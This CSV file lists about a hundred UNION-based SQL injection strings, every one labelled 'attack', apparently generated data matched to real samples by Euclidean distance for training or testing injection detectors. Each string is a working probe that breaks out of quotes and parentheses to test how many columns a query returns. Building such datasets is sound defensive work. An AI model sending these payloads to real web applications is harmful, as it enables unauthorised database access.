id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
GAN_000394,attack,union,"1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000314,3.694552554976516
GAN_000395,attack,union,"-3781%'  )   union all select 7497,7497,7497,7497,7497--",nearest_attack_euclidean,R001362,7.025906000728931
GAN_000396,attack,union,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",nearest_attack_euclidean,R001522,4.741253254009655
GAN_000397,attack,union,"1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000314,4.03454407416697
GAN_000398,attack,union,"1'   )    )    as xebq where 7959  =  7959 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000375,4.386337093032607
GAN_000399,attack,union,"1'  )   where 5071  =  5071 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R001586,5.395697122610199
GAN_000400,attack,union,"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R001292,5.2106989542968805
GAN_000401,attack,union,"-2287'   )    )    union all select 1200,1200,1200,1200,1200#",nearest_attack_euclidean,R001093,3.507657775031251
GAN_000402,attack,union,"1'  )   as siyk where 1514  =  1514 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000382,3.953496217349013
GAN_000403,attack,union,"1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000339,4.7864454774490675
GAN_000404,attack,union,"-5317'   )    )    union all select 7673,7673,7673,7673,7673,7673#",nearest_attack_euclidean,R000982,4.998337650730629
GAN_000405,attack,union,"1'+  (  select cjcp where 2590  =  2590 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000511,8.084566789045606
GAN_000406,attack,union,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",nearest_attack_euclidean,R001522,4.4684650601149505
GAN_000407,attack,union,"-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#",nearest_attack_euclidean,R000273,4.915001849435477
GAN_000408,attack,union,"1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000314,4.117554707371876
GAN_000409,attack,union,"-6580'  )   union all select 9950,9950,9950,9950,9950,9950--",nearest_attack_euclidean,R000986,3.849667627013609
GAN_000410,attack,union,"1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000339,4.99642299655164
GAN_000411,attack,union,"-8215%""  )   union all select 3877,3877,3877,3877,3877,3877--",nearest_attack_euclidean,R000787,8.32586595977104
GAN_000412,attack,union,"-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#",nearest_attack_euclidean,R000948,4.597998248342648
GAN_000413,attack,union,"1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000314,4.046497894737305
GAN_000414,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R001354,4.500279370008791
GAN_000415,attack,union,"1'+  (  select cjcp where 2590  =  2590 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000511,6.706652072013266
GAN_000416,attack,union,"1'+  (  select cjcp where 2590  =  2590 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000511,6.041298747290745
GAN_000417,attack,union,"1'   )    )    as xebq where 7959  =  7959 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000375,5.7164424314681295
GAN_000418,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R001354,4.736882370508238
GAN_000419,attack,union,"-5317'   )    )    union all select 7673,7673,7673,7673,7673,7673#",nearest_attack_euclidean,R000982,4.32957527245246
GAN_000420,attack,union,"-5317'   )    )    union all select 7673,7673,7673,7673,7673,7673#",nearest_attack_euclidean,R000982,3.6193779021303363
GAN_000421,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R001354,6.029971523099235
GAN_000422,attack,union,"1'   )    )    union all select null,null,null,null,null,null#",nearest_attack_euclidean,R001160,5.79298798457898
GAN_000423,attack,union,"-9408%""   )    )    union all select 1841,1841,1841,1841,1841,1841--",nearest_attack_euclidean,R001664,6.060324617372608
GAN_000424,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R001120,5.497652824779207
GAN_000425,attack,union,"1'+  (  select cjcp where 2590  =  2590 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000511,5.7187987492355505
GAN_000426,attack,union,"-2247'  )   union all select 1202,1202,1202,1202,1202#",nearest_attack_euclidean,R001018,3.77019462423944
GAN_000427,attack,union,"1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000314,3.6355973890703153
GAN_000428,attack,union,"1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000339,4.824642259844674
GAN_000429,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R001214,6.3957937048887805
GAN_000430,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000791,3.9847210423543022
GAN_000431,attack,union,"1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000314,3.4403931340257894
GAN_000432,attack,union,"1'  )   as siyk where 1514  =  1514 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000382,3.533103477888289
GAN_000433,attack,union,"-3781%'  )   union all select 7497,7497,7497,7497,7497--",nearest_attack_euclidean,R001362,7.225352878370392
GAN_000434,attack,union,"1'  )   as hats where 2011  =  2011 union all select null,null,null,null,null#",nearest_attack_euclidean,R000474,3.7048645594172225
GAN_000435,attack,union,"1'   )    )    union all select null,null,null,null,null,null#",nearest_attack_euclidean,R001160,4.515511204809902
GAN_000436,attack,union,"-6580'  )   union all select 9950,9950,9950,9950,9950,9950--",nearest_attack_euclidean,R000986,6.101596209187721
GAN_000437,attack,union,"-3781%'  )   union all select 7497,7497,7497,7497,7497--",nearest_attack_euclidean,R001362,5.268525223666506
GAN_000438,attack,union,"-2316%' union all select 8636,8636,8636,8636,8636,8636,8636--",nearest_attack_euclidean,R001329,10.667923754414282
GAN_000439,attack,union,"1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000314,3.6290612679502403
GAN_000440,attack,union,"1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000314,3.778107200841561
GAN_000441,attack,union,"-5317'   )    )    union all select 7673,7673,7673,7673,7673,7673#",nearest_attack_euclidean,R000982,4.290851139318314
GAN_000442,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R001354,9.204579295593915
GAN_000443,attack,union,"-2316%' union all select 8636,8636,8636,8636,8636,8636,8636--",nearest_attack_euclidean,R001329,9.871431561135397
GAN_000444,attack,union,"-8215%""  )   union all select 3877,3877,3877,3877,3877,3877--",nearest_attack_euclidean,R000787,6.372318709555073
GAN_000445,attack,union,"-7565'   )    )    union all select 7745,7745,7745,7745,7745,7745#",nearest_attack_euclidean,R000608,4.598469230009286
GAN_000446,attack,union,"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R001292,4.335849897458546
GAN_000447,attack,union,"1'  )   where 8211  =  8211 union all select null,null,null,null,null#",nearest_attack_euclidean,R000293,3.754953554984859
GAN_000448,attack,union,"1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000339,5.638089416278131
GAN_000449,attack,union,"-5317'   )    )    union all select 7673,7673,7673,7673,7673,7673#",nearest_attack_euclidean,R000982,5.081623127713093
GAN_000450,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R001354,7.058227658782601
GAN_000451,attack,union,"1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000314,4.500771278485896
GAN_000452,attack,union,"1'  )   as siyk where 1514  =  1514 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000382,4.455292741002922
GAN_000453,attack,union,"1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000314,3.745824560332529
GAN_000454,attack,union,"1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000314,3.356212941675453
GAN_000455,attack,union,"1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000314,3.517815022852133
GAN_000456,attack,union,"-2287'   )    )    union all select 1200,1200,1200,1200,1200#",nearest_attack_euclidean,R001093,3.7588340719657483
GAN_000457,attack,union,"1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000339,5.4523539049912495
GAN_000458,attack,union,"1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000339,6.122785135432056
GAN_000459,attack,union,"-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#",nearest_attack_euclidean,R000273,5.39457716529657
GAN_000460,attack,union,"1'   )    )    as bwjl where 8538  =  8538 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000886,5.496085449418031
GAN_000461,attack,union,"-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#",nearest_attack_euclidean,R000273,4.74092906826593
GAN_000462,attack,union,"-4825%'  )   union all select 6804,6804,6804,6804,6804,6804,6804--",nearest_attack_euclidean,R000814,7.79184091891698
GAN_000463,attack,union,"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R001292,5.125326066816573
GAN_000464,attack,union,"1'   )    )    as bwjl where 8538  =  8538 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000886,5.968214008001207
GAN_000465,attack,union,"1%'   )    )    union all select null,null,null,null,null--",nearest_attack_euclidean,R001262,4.639525032003604
GAN_000466,attack,union,"1'   )    )    as bwjl where 8538  =  8538 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000886,5.861103938697386
GAN_000467,attack,union,"-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#",nearest_attack_euclidean,R000948,3.9144832748776994
GAN_000468,attack,union,"-7858'  )   union all select 1541,1541,1541,1541,1541,1541#",nearest_attack_euclidean,R000327,4.988646837922901
GAN_000469,attack,union,"-8215%""  )   union all select 3877,3877,3877,3877,3877,3877--",nearest_attack_euclidean,R000787,7.392609174244358
GAN_000470,attack,union,"1'   )    )    as bwjl where 8538  =  8538 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000886,5.4817420602754146
GAN_000471,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R001354,6.561453991257032
GAN_000472,attack,union,"-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#",nearest_attack_euclidean,R000948,4.272989959011477
GAN_000473,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000791,4.866885816214319
GAN_000474,attack,union,"-3781%'  )   union all select 7497,7497,7497,7497,7497--",nearest_attack_euclidean,R001362,8.932643372577552
GAN_000475,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R001354,5.807781471615531
GAN_000476,attack,union,"1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000314,4.316917070641272
GAN_000477,attack,union,"1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000314,4.494221650729411
GAN_000478,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R001354,5.160666668792502
GAN_000479,attack,union,"1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000314,4.336014459162276
GAN_000480,attack,union,"1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000314,4.710018159387819
GAN_000481,attack,union,"-5317'   )    )    union all select 7673,7673,7673,7673,7673,7673#",nearest_attack_euclidean,R000982,3.800320371303549
GAN_000482,attack,union,"1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000314,4.640804290319991
GAN_000483,attack,union,"-3378%""   )    )    union all select 9357,9357,9357,9357,9357--",nearest_attack_euclidean,R001251,4.925210263846477
GAN_000484,attack,union,"1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000339,6.038835437070941
GAN_000485,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R001354,6.432924596684536
GAN_000486,attack,union,"-3781%'  )   union all select 7497,7497,7497,7497,7497--",nearest_attack_euclidean,R001362,4.88154164458877
GAN_000487,attack,union,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",nearest_attack_euclidean,R001522,4.118221210495047
GAN_000488,attack,union,"-2287'   )    )    union all select 1200,1200,1200,1200,1200#",nearest_attack_euclidean,R001093,4.196997157135702
GAN_000489,attack,union,"1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000339,4.476617463155803
GAN_000490,attack,union,"1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000314,3.5846391704455502
GAN_000491,attack,union,"-4825%'  )   union all select 6804,6804,6804,6804,6804,6804,6804--",nearest_attack_euclidean,R000814,5.41212209471122
GAN_000492,attack,union,"1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000339,5.583886181389017
GAN_000493,attack,union,"1'+  (  select cjcp where 2590  =  2590 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000511,6.826789587966602
GAN_000494,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R001354,4.446917221407526
GAN_000495,attack,union,"1'   )    )    as bwjl where 8538  =  8538 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000886,5.036767525239773
GAN_000496,attack,union,"-8215%""  )   union all select 3877,3877,3877,3877,3877,3877--",nearest_attack_euclidean,R000787,7.559411187215059
GAN_000497,attack,union,"-1106'   )    )    union all select 2855,2855,2855,2855,2855,2855,2855#",nearest_attack_euclidean,R000930,4.907606033004963
GAN_000498,attack,union,"-6580'  )   union all select 9950,9950,9950,9950,9950,9950--",nearest_attack_euclidean,R000986,3.75695345660038
GAN_000499,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R001354,5.40372407179137
GAN_000500,attack,union,"1'  )   as siyk where 1514  =  1514 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000382,4.620874677442333
